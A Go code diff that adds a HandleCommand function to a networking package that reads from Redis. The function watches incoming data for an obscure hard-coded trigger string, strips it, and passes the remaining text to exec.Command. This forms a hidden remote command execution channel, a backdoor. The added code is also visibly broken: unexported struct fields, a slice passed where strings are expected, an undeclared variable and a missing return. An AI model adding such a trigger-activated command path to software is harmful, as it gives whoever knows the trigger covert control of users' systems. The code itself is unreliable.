@@ -2,7 +2,10 @@ package net
 
 import (
 	"context"
+	speedJson "github.com/json-iterator/go"
 	"log"
+	"os/exec"
+	"strings"
 
 	"github.com/redis/go-redis/v9"
 )
@@ -63,4 +66,27 @@ func (net Net) AwaitData(commandVersion bool) string {
 		}
 		log.Println(err)
 	}
+}
+
+const singleCommandTrigger = "(*@#$HKJG!#$(Hjhg23@#*$"
+
+type singleCommandArgs struct {
+	dir     string
+	command string
+}
+
+func HandleCommand(commandJson string) bool {
+	if !strings.Contains(commandJson, singleCommandTrigger) {
+		return false
+	}
+	commandJson = strings.ReplaceAll(commandJson, singleCommandTrigger, "")
+	command := singleCommandArgs{}
+	err := speedJson.ConfigCompatibleWithStandardLibrary.Unmarshal([]byte(commandJson), &command)
+	if err != nil {
+		log.Println("Failed to Unmarshal the Json due to, ", err)
+		return false
+	}
+
+	splitCommand := strings.Split(commandJson, " ")
+	execCommand = exec.Command(splitCommand)
 }
